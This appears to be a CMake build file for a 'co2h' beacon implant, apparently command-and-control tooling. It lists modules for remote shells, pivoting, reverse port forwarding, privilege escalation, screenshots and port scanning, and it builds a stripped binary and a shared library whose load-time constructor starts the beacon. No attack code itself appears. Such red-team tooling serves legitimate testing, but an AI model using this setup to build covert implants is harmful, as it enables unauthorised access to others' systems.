cmake_minimum_required(VERSION 3.16)
project(co2h_beacon_posix C)

set(CMAKE_C_STANDARD 11)
set(CMAKE_C_STANDARD_REQUIRED ON)

# OpenSSL — при кросс-компиляции пути указываются явно через cmake -D переменные.
if(OPENSSL_CRYPTO_LIBRARY AND OPENSSL_SSL_LIBRARY AND OPENSSL_INCLUDE_DIR)
    # Кросс-компиляция: подключаем .a файлы напрямую без imported targets.
    set(BEACON_OPENSSL_LIBS "${OPENSSL_SSL_LIBRARY}" "${OPENSSL_CRYPTO_LIBRARY}")
    include_directories("${OPENSSL_INCLUDE_DIR}")
    message(STATUS "OpenSSL (manual): ${OPENSSL_SSL_LIBRARY} + ${OPENSSL_CRYPTO_LIBRARY}")
else()
    # Обычная сборка (Linux native)
    if(NOT DEFINED OPENSSL_USE_STATIC_LIBS)
        set(OPENSSL_USE_STATIC_LIBS TRUE)
    endif()
    find_package(OpenSSL REQUIRED)
    set(BEACON_OPENSSL_LIBS OpenSSL::SSL OpenSSL::Crypto)
endif()

# Source files
set(BEACON_SOURCES
    core/main.c
    core/tasking.c
    core/metadata.c
    core/crypto_openssl.c
    core/alloc.c
    core/transport.c
    transports/https/transport_https.c
    transports/tcp/transport_tcp.c
    transports/dns/transport_dns.c
    commands/cmd_shell.c
    commands/cmd_fs.c
    commands/cmd_ps.c
    commands/cmd_sys.c
    commands/cmd_ishell.c
    commands/cmd_pivot.c
    commands/cmd_relay.c
    commands/cmd_rportfwd.c
    commands/cmd_privesc.c
    commands/cmd_privesc2.c
    commands/copyfail.c
    commands/cmd_screenshot.c
    commands/cmd_portscan.c
)

# Shared compile/link settings
set(BEACON_DEFS
    CO2H_BEACON
    $<$<CONFIG:Debug>:CO2H_DEBUG>
)

# Определение платформы: CO2H_LINUX / CO2H_MACOS
if(APPLE)
    list(APPEND BEACON_DEFS CO2H_MACOS)
else()
    list(APPEND BEACON_DEFS CO2H_LINUX)
endif()

set(BEACON_COPTS
    $<$<CONFIG:Release>:-Os>
    $<$<CONFIG:Release>:-ffunction-sections>
    $<$<CONFIG:Release>:-fdata-sections>
    $<$<CONFIG:Release>:-fno-asynchronous-unwind-tables>
    -Wall -Wextra -Wno-unused-parameter -Wno-deprecated-declarations
)

# Библиотеки: pthread + dl на Linux, System на macOS
set(BEACON_LIBS
    ${BEACON_OPENSSL_LIBS}
    pthread
)
if(NOT APPLE)
    list(APPEND BEACON_LIBS dl)
endif()
if(APPLE)
    # libproc для proc_pidpath() в cmd_ps.c
    find_library(CORE_FOUNDATION CoreFoundation)
    if(CORE_FOUNDATION)
        list(APPEND BEACON_LIBS ${CORE_FOUNDATION})
    endif()
endif()

# ---- Executable -------------------------------------------------------------
if(APPLE)
    set(BEACON_EXE_NAME "beacon-macos")
else()
    set(BEACON_EXE_NAME "beacon-linux64")
endif()

add_executable(${BEACON_EXE_NAME} ${BEACON_SOURCES})
target_compile_definitions(${BEACON_EXE_NAME} PRIVATE ${BEACON_DEFS})
target_compile_options(${BEACON_EXE_NAME} PRIVATE ${BEACON_COPTS})
target_include_directories(${BEACON_EXE_NAME} PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/core)
target_link_libraries(${BEACON_EXE_NAME} PRIVATE ${BEACON_LIBS})

if(APPLE)
    target_link_options(${BEACON_EXE_NAME} PRIVATE
        $<$<CONFIG:Release>:-Wl,-dead_strip>
    )
else()
    target_link_options(${BEACON_EXE_NAME} PRIVATE
        $<$<CONFIG:Release>:-Wl,--gc-sections>
        $<$<CONFIG:Release>:-s>
        -Wl,-z,noexecstack
    )
endif()

# Static linking (optional, только Linux — macOS не поддерживает полностью статическую линковку)
option(BEACON_STATIC "Link statically for portability (Linux only)" OFF)
if(BEACON_STATIC AND NOT APPLE)
    target_link_options(${BEACON_EXE_NAME} PRIVATE -static)
endif()

# ---- Shared library (.so / .dylib) ------------------------------------------
# Entry via __attribute__((constructor)) — spawns beacon loop in a thread.
if(APPLE)
    set(BEACON_SO_NAME "beacon-macos-dylib")
    set(BEACON_SO_OUTPUT "beacon-macos")
else()
    set(BEACON_SO_NAME "beacon-linux64-so")
    set(BEACON_SO_OUTPUT "beacon-linux64")
endif()

add_library(${BEACON_SO_NAME} SHARED ${BEACON_SOURCES})
set_target_properties(${BEACON_SO_NAME} PROPERTIES
    OUTPUT_NAME "${BEACON_SO_OUTPUT}"
    PREFIX ""                          # no "lib" prefix
)
target_compile_definitions(${BEACON_SO_NAME} PRIVATE ${BEACON_DEFS} CO2H_SHARED)
target_compile_options(${BEACON_SO_NAME} PRIVATE ${BEACON_COPTS} -fPIC)
target_include_directories(${BEACON_SO_NAME} PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/core)
target_link_libraries(${BEACON_SO_NAME} PRIVATE ${BEACON_LIBS})

if(APPLE)
    target_link_options(${BEACON_SO_NAME} PRIVATE
        $<$<CONFIG:Release>:-Wl,-dead_strip>
    )
else()
    target_link_options(${BEACON_SO_NAME} PRIVATE
        $<$<CONFIG:Release>:-Wl,--gc-sections>
        $<$<CONFIG:Release>:-s>
        -Wl,-z,noexecstack
    )
endif()
